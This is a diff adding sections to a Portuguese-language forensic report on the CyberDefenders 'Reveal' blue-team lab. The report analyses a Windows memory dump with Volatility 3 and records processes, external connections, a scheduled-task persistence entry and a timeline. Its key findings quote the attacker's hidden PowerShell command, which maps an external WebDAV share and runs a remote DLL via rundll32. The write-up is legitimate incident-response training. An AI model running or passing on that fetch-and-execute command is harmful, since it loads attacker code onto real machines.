@@ -227,3 +227,27 @@ Ver `reports/dfir/dlllist_pid1260.txt` (caso salvo) e `reports/dfir/dlllist_all.
 (veja também: reports/dfir/findings/evidence_ps_tree.txt)
 \`\`\`
 
+
+## 1. Sumário executivo
+**Contexto:** Estação Windows com acesso a dados financeiros sinalizada pelo SIEM; dump de memória coletado para confirmação de comprometimento e contenção.
+
+**Escopo:** Identificar processos/linhas de comando/conexões externas, sinais de injeção e persistência; montar timeline do incidente.
+
+**Achados-chave:**
+- **LOLBAS**: `powershell.exe` (janela oculta) → `net use \\45.9.74.32@8888\davwwwroot\ ; rundll32 \\45.9.74.32@8888\davwwwroot\3435.dll,entry` (WebDAV externo + DLL remota).
+- Conexões externas: destaque para `svchost.exe (PID 1260)` → **196.204.4.8:80** (HTTP, não interno; investigar).
+- **Persistência** provável: `ScheduledTasks` registra `{ED77AEE0-EAFB-4133-B544-9E7C5632D902}` às 07:00:00 UTC.
+- Sem evidência conclusiva de injeção nos PIDs principais nos trechos de `malfind` fornecidos (possível execução transitória).
+
+## 2. Metodologia
+**Ferramenta:** Volatility 3 (plugins: windows.info, pslist, pstree, netscan, dlllist, handles, malfind, timeliner, cmdline)  
+**Imagem analisada:** 
+- Lab: https://cyberdefenders.org/blueteam-ctf-challenges/reveal/
+- Local: raw_data/dfir/192-Reveal.dmp (symlink para /Users/ricardoalmeida/Downloads/CyberDefender/Reveal Lab/temp_extract_dir/192-Reveal.dmp)
+
+**Data/hora (janela em artefatos):**
+- 2024-07-04 10:44:50 UTC — svchosts base iniciam
+- 2024-07-04 10:45:14 UTC — atividade msedge (utility)
+- 2024-07-15 06:58–06:59 UTC — conexões externas (svchost)
+- 2024-07-15 07:00:00 UTC — criação de Scheduled Task
+
